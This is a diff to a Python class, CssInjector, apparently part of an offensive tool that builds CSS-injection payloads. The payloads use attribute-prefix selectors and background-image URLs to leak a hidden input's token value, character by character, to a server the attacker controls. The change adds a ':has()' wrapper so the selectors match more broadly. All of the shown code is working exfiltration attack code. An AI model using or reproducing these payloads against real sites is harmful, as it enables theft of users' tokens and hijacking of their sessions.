@@ -59,7 +59,7 @@ class CssInjector:
     def generate_injection(self):
         stri = f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}');\n"
         stri += f'{self.identifier}[value={repr(self.token)}]{"".join([":first-child" for i in range(len(self.token))])}{{background: url("//{self.hostname}:{self.port}/end") !important;}}'
-        stri += f"""{"".join(map(lambda x: f'{self.identifier}[value^={repr(self.token+x)}]{"".join([":first-child" for i in range(len(self.token))])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.token+x)}") !important;}}\n', "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"))}"""
+        stri += f"""{"".join(map(lambda x: f'*:has({self.identifier}[value^={repr(self.token+x)}]){"".join([":first-child" for i in range(len(self.token))])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.token+x)}") !important;}}\n', "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"))}"""
         return stri
 
     async def handle_start(self, request):
